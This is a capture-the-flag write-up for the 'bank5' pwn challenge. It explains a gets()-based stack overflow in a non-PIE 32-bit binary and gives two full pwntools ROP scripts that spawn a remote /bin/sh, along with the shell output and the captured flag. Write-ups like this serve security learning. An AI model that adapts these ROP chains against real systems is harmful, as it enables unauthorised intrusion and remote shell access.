## bank5 (200 points)

#### Solved by hieplpvip

```
nc 61.28.237.24 30206

author: xikhud
```

Decompiling `bank5` with IDA, we see that `getFlag` no longer exists. NX is also enabled, so we can not inject shellcode. However, as `bank5` doesn't have PIE enabled and uses gets (which accepts null bytes) to read our input, we can use ROP.

```
$ pwn checksec bank5
[*] '/home/hieple/bank5'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Our goal is to call `execve("/bin/sh", NULL, NULL)`. We need to setup the registers as follows:

```
EAX = 11 - The execve syscall number
EBX = Address in memory of the string "/bin/sh"
ECX = NULL
EDX = NULL
```

`/bin/sh` doesn't exist in `bank5`, so we also need to put it in memory.

```py
from pwn import *

INT_0x80_ADDR = 0x08049553  # int 0x80
POP_EAX_ADDR = 0x0809d514  # pop eax ; ret
POP_EDX_ADDR = 0x0806dfab  # pop edx ; ret
POP_ECX_EBX_ADDR = 0x0806dfd2  # pop ecx ; pop ebx ; ret
MOV_EDX_INTO_EAX_ADDR = 0x0809cd34  # mov dword ptr [eax], edx ; ret
SAFE_ADDR = 0x080da320  # .bss section
EXEC = '/bin/sh\x00'
EXEC = [EXEC[:4], EXEC[4:]]

def write_mem(value, addr):
  if type(value) == int:
    value = p32(value)
  if type(value) == str:
    value = value.encode('utf-8')
  payload = p32(POP_EDX_ADDR) + value
  payload += p32(POP_EAX_ADDR) + p32(addr)
  payload += p32(MOV_EDX_INTO_EAX_ADDR)
  return payload

# Write EXEC into SAFE_ADDR
payload = b'A' * 80  # padding
payload += write_mem(EXEC[0], SAFE_ADDR)
payload += write_mem(EXEC[1], SAFE_ADDR + 4)

# Populate registers for the syscall
payload += p32(POP_EAX_ADDR) + p32(11)
payload += p32(POP_ECX_EBX_ADDR) + p32(0) + p32(SAFE_ADDR)
payload += p32(POP_EDX_ADDR) + p32(0)

# Syscall
payload += p32(INT_0x80_ADDR)

conn = remote('61.28.237.24', 30206)
conn.sendline(payload)
conn.interactive()
```

```
$ ls
bank5
bin
dev
flag.txt
lib
lib32
lib64
$ cat flag.txt
HCMUS-CTF{rop_and_shellcode}
```

**Flag:** `HCMUS-CTF{rop_and_shellcode}`

### Appendix

We can also call `gets` to write `/bin/sh`.

```py
from pwn import *

elf = ELF('bank5')

GETS_ADDR = elf.symbols['gets']
INT_0x80_ADDR = 0x08049553  # int 0x80
POP_EAX_ADDR = 0x0809d514  # pop eax ; ret
POP_EDX_ADDR = 0x0806dfab  # pop edx ; ret
POP_ECX_EBX_ADDR = 0x0806dfd2  # pop ecx ; pop ebx ; ret
SAFE_ADDR = 0x080da320  # .bss section

# Use gets to write "/bin/sh" to SAFE_ADDR
payload = b'A' * 80  # padding
payload += p32(GETS_ADDR)
payload += p32(POP_EAX_ADDR)
payload += p32(SAFE_ADDR)

# Populate registers for the syscall
payload += p32(POP_EAX_ADDR) + p32(11)
payload += p32(POP_ECX_EBX_ADDR) + p32(0) + p32(SAFE_ADDR)
payload += p32(POP_EDX_ADDR) + p32(0)

# Syscall
payload += p32(INT_0x80_ADDR)

conn = remote('61.28.237.24', 30206)
conn.sendline(payload)
conn.sendline('/bin/sh\x00')
conn.interactive()
```
